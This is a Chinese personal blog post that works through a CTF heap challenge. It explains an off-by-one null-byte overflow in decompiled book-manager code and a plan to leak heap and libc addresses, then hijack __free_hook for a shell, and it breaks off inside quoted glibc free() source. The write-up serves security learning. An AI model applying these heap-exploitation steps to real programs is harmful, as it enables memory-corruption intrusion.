<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        堆入门-off-by-one - 萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
     你若盛开，清风自来！ 
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg">
        </div>
        <div class="name">
            萝卜
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li>
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li>
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li>
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li>
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#初识"><span class="toc-text">初识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆的一些专业术语"><span class="toc-text">堆的一些专业术语</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆的基本操作"><span class="toc-text">堆的基本操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分配"><span class="toc-text">分配</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#释放"><span class="toc-text">释放</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆溢出"><span class="toc-text">堆溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Off-By-One"><span class="toc-text">Off-By-One</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用方法"><span class="toc-text">漏洞利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#glibc-2-19-malloc-malloc-c-第1830行"><span class="toc-text">glibc-2.19/malloc/malloc.c 第1830行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#free函数内部实现代码glibc-2-19-malloc-malloc-c-第2908行"><span class="toc-text">free函数内部实现代码glibc-2.19/malloc/malloc.c 第2908行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#个人感悟"><span class="toc-text">个人感悟</span></a></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input">
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        堆入门-off-by-one
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2019-06-11 20:45:24</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>

    </div>
    <div class="post-content no-indent">
        <p>头大头大！<br><a id="more"></a></p>
<h3 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h3><ul>
<li>堆是动态分配的，只有在程序中需要时才会分配</li>
<li>程序虚拟地址空间的一块连续的线性区域</li>
<li>堆的生长方向是从低地址向高地址生长的，而栈是从高地址向低地址生长的</li>
</ul>
<h3 id="堆的一些专业术语"><a href="#堆的一些专业术语" class="headerlink" title="堆的一些专业术语"></a>堆的一些专业术语</h3><p>chunk：malloc 申请的内存</p>
<h3 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h3><h4 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">extern void *malloc(unsigned int num_bytes);</span><br><span class="line"></span><br><span class="line"> 头文件 ：stdlib.h</span><br><span class="line">void* 表示未确定的指针，可以指向任何类型的数据</span><br><span class="line">参数：指明分配的堆块大小，当为0的时候，返回当前系统允许的堆的最小内存块，当为负数时，由于在大多数系统上，size_t是无符号的，所以程序就会申请很大的内存空间</span><br><span class="line"></span><br><span class="line">返回值：如分配成功则返回指向被分配内存的指针（堆的初始值不确定），否则返回空指针NULL</span><br></pre></td></tr></table></figure>
<h4 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void free(void *ptr);</span><br><span class="line"></span><br><span class="line">参数：释放ptr指向的内存块</span><br><span class="line">当ptr是空指针时，函数不执行任何操作</span><br><span class="line">当ptr已经释放之后，再次释放会出现乱七八糟的效果</span><br></pre></td></tr></table></figure>
<h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p>堆溢出是指向某个堆块中写入的字节数超过了堆块本身可使用的字节数，从而导致堆溢出，并覆盖到相邻高地址的堆块</p>
<h3 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h3><p>这个漏洞是一种特殊的溢出漏洞，指的是想堆中写入时，写入的字节数超过了这个堆块所申请的字节数仅仅一个字节，造成原因就是边界代码不严谨</p>
<h4 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h4><p>这里通过一个CTF题来具体说一个该漏洞利用的方法</p>
<p>首先程序开启了RELRO、NX、PIE保护<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">一筐萝卜 ➜ pwn  checksec --file pwn </span><br><span class="line">[*] '/media/wxm/Lenovo/study/pwn'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">一筐萝卜 ➜ pwn</span><br></pre></td></tr></table></figure></p>
<p>运行并拖到IDA中，是一个典型的菜单堆题<br><img src="https://s2.ax1x.com/2019/06/11/VgqDhR.jpg" alt><br>首先了解各个分支的功能</p>
<p>首先是向<code>off_202018  -&gt; unk_202040</code>读入<code>author name</code>，限制读入的字节数是32，但是程序通过<code>sub_9F5</code>函数来读入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall sub_9F5(_BYTE *a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+14h] [rbp-Ch]</span><br><span class="line">  _BYTE *buf; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( a2 &lt;= 0 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  buf = a1;</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( read(0, buf, 1uLL) != 1 )</span><br><span class="line">      return 1LL;</span><br><span class="line">    if ( *buf == 10 )</span><br><span class="line">      break;</span><br><span class="line">    ++buf;</span><br><span class="line">    if ( i == a2 )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = 0;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数中存在<code>Off-By-One</code>漏洞，导致可以多读入一个<code>\x00</code>字节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nEnter book name size: "</span>, *&amp;v2);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter book name (Max 32 chars): "</span>, &amp;v2);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(v2);</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( sub_9F5(ptr, v2 - <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"fail to read name"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v2 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nEnter book description size: "</span>, *&amp;v2);</span><br><span class="line">        __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = <span class="built_in">malloc</span>(v2);</span><br><span class="line">          <span class="keyword">if</span> ( v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Enter book description: "</span>, &amp;v2);</span><br><span class="line">            v0 = v6;</span><br><span class="line">            <span class="keyword">if</span> ( sub_9F5(v6, v2 - <span class="number">1</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"Unable to read description"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v3 = sub_B24(v0);</span><br><span class="line">              <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Library is full"</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">                <span class="keyword">if</span> ( v4 )</span><br><span class="line">                &#123;</span><br><span class="line">                  *(v4 + <span class="number">6</span>) = v2;</span><br><span class="line">                  *(off_202010 + v3) = v4;</span><br><span class="line">                  *(v4 + <span class="number">2</span>) = v6;</span><br><span class="line">                  *(v4 + <span class="number">1</span>) = ptr;</span><br><span class="line">                  *v4 = ++unk_202024;</span><br><span class="line">                  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Unable to allocate book struct"</span>);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Fail to allocate memory"</span>, &amp;v2);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Malformed size"</span>, &amp;v2);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"unable to allocate enough space"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Malformed size"</span>, &amp;v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    <span class="built_in">free</span>(v6);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">free</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个分支是创建一个book，book name大小自拟，最大规定是32，但是没有限制，所以可以随意大小，book description大小同样自拟，这些数据都会分配堆块来进行存储，如果创建成功会创建一个0x20大小的堆块来存储book的信息，每一个book信息是一个结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> id;</span><br><span class="line">	<span class="keyword">char</span> *heap_name;</span><br><span class="line">	<span class="keyword">char</span> *heap_description;</span><br><span class="line">	<span class="keyword">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而每一个这样结构体的地址存在<code>off_202010 -&gt; unk_202060</code>，可以看出来，和author紧邻，并且仅仅差了0x20，而输入author处还存在溢出一位<code>\x00</code>，那么就会把第一个book_info结构体的地址的最后一个字节覆盖成<code>\x00</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the book id you want to delete: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; (!*(off_202010 + i) || **(off_202010 + i) != v1); ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( i != <span class="number">20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(*(off_202010 + i) + <span class="number">8L</span>L));</span><br><span class="line">      <span class="built_in">free</span>(*(*(off_202010 + i) + <span class="number">16L</span>L));</span><br><span class="line">      <span class="built_in">free</span>(*(off_202010 + i));</span><br><span class="line">      *(off_202010 + i) = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Can't find selected book!"</span>, &amp;v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wrong id"</span>, &amp;v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个是一个detele选项，读入一个book的id，然后通过free各个堆块来将这个book_info清除</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the book id you want to edit: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; (!*(off_202010 + i) || **(off_202010 + i) != v1); ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">20</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Can't find selected book!"</span>, &amp;v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Enter new book description: "</span>, &amp;v1);</span><br><span class="line">      <span class="keyword">if</span> ( !sub_9F5(*(*(off_202010 + i) + <span class="number">16L</span>L), *(*(off_202010 + i) + <span class="number">24L</span>L) - <span class="number">1</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Unable to read new description"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wrong id"</span>, &amp;v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个选项用于编辑某个book_info中的description，大小同样是创建时候的大小</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int show()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rax</span><br><span class="line">  signed int i; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt;= 19; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *(off_202010 + i);</span><br><span class="line">    if ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;ID: %d\n&quot;, **(off_202010 + i));</span><br><span class="line">      printf(&quot;Name: %s\n&quot;, *(*(off_202010 + i) + 8LL));</span><br><span class="line">      printf(&quot;Description: %s\n&quot;, *(*(off_202010 + i) + 16LL));</span><br><span class="line">      LODWORD(v0) = printf(&quot;Author: %s\n&quot;, off_202018);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个选项是将指定的book_info给打印出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">change_author</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter author name: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_9F5(off_202018, <span class="number">32</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"fail to read author_name"</span>, <span class="number">32L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个是用来改变author name</p>
<p>了解了这个程序的基本流程，并且发现这个程序中存在漏洞，下面来一步一步的利用这个漏洞来getshell</p>
<p>程序开启了PIE，地址都是随机化，所以我们要泄露部分地址，前面我们知道author和第一个book_info会造成覆盖，首先我们对author输入32位，程序自己再加上一位<code>\x00</code>，当我们创建一个book时，这个    <code>\x00</code>就会被book的地址覆盖掉，此时author和第一个地址就连到一块<br><img src="https://s2.ax1x.com/2019/06/11/VgqRBD.jpg" alt><br>然后show book info的时候会打印author，就会把这个地址给带出来</p>
<p>最后一位只能覆盖成<code>\x00</code>，那么我们构造出来第一个book的des堆块的地址最后一位是<code>\x00</code>，那么覆盖了之后就直接指向了第一个book的des堆块</p>
<p>此时堆块中的结构如下<br><img src="https://s2.ax1x.com/2019/06/11/VgqhAH.jpg" alt><br>我们将book name创建大一些，试des堆块正好最后一位是<code>\x00</code></p>
<p>那么第一个book的name大小应该是128，des的大小32就好</p>
<p>创建之后再对author修改，同样是输入<code>&quot;a&quot;*32</code>，这样的话第一个book_info的地址就是第一个book_info的des的地址</p>
<p>通过刚刚泄露出来的堆块地址计算出来第二个堆块的地址（泄露libc基地址用），提前将des中存着我们伪造的book_info</p>
<p>这里泄露libc基地址的方法有点骚，emmm，需要知道一个系统特性，当分配的堆块的大小在某一个范围内的话，系统会通过brk方法来分配（brk 会直接拓展原来的堆），但是当分配超级大的堆块时，程序会用mmap方法来分配堆（mmap 会单独映射一块内存），mmap分配的堆块和libc之间存在着固定的偏移，因此我们可以推算出来libc的基地址（偏移需要用gdb中的vmmap来计算）</p>
<p>泄露出来libc基地址后，就要想办法来getshell了，这道题<code>Full RELRO</code>，我们无法通过覆盖got表来getshell</p>
<p>这里通过<code>__free_hook</code>来劫持free函数<br>原理是什么呢</p>
<h5 id="glibc-2-19-malloc-malloc-c-第1830行"><a href="#glibc-2-19-malloc-malloc-c-第1830行" class="headerlink" title="glibc-2.19/malloc/malloc.c 第1830行"></a>glibc-2.19/malloc/malloc.c 第1830行</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">weak_variable</span> <span class="params">(*__free_hook)</span> <span class="params">(<span class="keyword">void</span> *__ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   <span class="keyword">const</span> <span class="keyword">void</span> *)</span> </span>= <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>可以看出来<code>__free_hook</code>是一个常量</p>
<h5 id="free函数内部实现代码glibc-2-19-malloc-malloc-c-第2908行"><a href="#free函数内部实现代码glibc-2-19-malloc-malloc-c-第2908行" class="headerlink" title="free函数内部实现代码glibc-2.19/malloc/malloc.c 第2908行"></a>free函数内部实现代码glibc-2.19/malloc/malloc.c 第2908行</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span 